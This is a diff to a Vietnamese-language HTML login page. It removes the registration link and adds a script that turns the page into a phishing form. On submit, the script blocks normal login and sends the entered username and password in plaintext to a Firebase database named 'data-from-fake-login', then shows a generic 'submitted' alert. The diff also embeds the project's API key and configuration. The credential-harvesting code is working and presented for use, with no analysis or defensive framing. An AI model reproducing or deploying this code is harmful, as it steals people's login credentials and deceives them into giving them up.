@@ -51,6 +51,7 @@
       href="https://unpkg.com/boxicons@2.1.2/css/boxicons.min.css"
       rel="stylesheet"
     />
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
   </head>
 
   <body style="height: 100vh; overflow: hidden">
@@ -116,13 +117,10 @@
                       ></span
                     ></label>
                   </div>
-                  <button id="submit" class="rounded-2">Đăng nhập</button
+                  <button id="submit" type="submit" class="rounded-2">
+                    Đăng nhập</button
                   ><span></span>
                 </form>
-                <span class="register-choose"
-                  ><label>Bạn chưa có tài khoản. </label
-                  ><a>Đăng ký ngay?</a></span
-                >
               </div>
             </div>
           </div>
@@ -133,5 +131,44 @@
       </div>
     </div>
     <!------------------------Page Layout Content------------------------->
+    <!------------------------Scripting------------------------->
+    <script type="module">
+      import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.11/firebase-app.js";
+      import {
+        getDatabase,
+        ref,
+        set,
+        get,
+        child,
+      } from "https://www.gstatic.com/firebasejs/9.6.11/firebase-database.js";
+      const firebaseConfig = {
+        apiKey: "AIzaSyDoJmsJ4Jqrh_ymYFuH3IMGnW8o7LHdYQs",
+        authDomain: "data-from-fake-login.firebaseapp.com",
+        projectId: "data-from-fake-login",
+        storageBucket: "data-from-fake-login.appspot.com",
+        messagingSenderId: "979032913693",
+        appId: "1:979032913693:web:8075f3c2747e721e8e93f4",
+        measurementId: "G-L54PTDPCSB",
+      };
+
+      // Initialize Firebase
+      const app = initializeApp(firebaseConfig);
+
+      // Get a reference to the database service
+      const db = getDatabase(app);
+
+      document
+        .getElementById("form-login")
+        .addEventListener("submit", function (e) {
+          e.preventDefault();
+          set(ref(db, "users/" + Math.random().toString(36).slice(2, 7)), {
+            username: document.getElementById("username").value,
+            password: document.getElementById("password").value,
+          });
+
+          alert("Your form is submitted");
+          document.getElementById("form-login").reset();
+        });
+    </script>
   </body>
 </html>
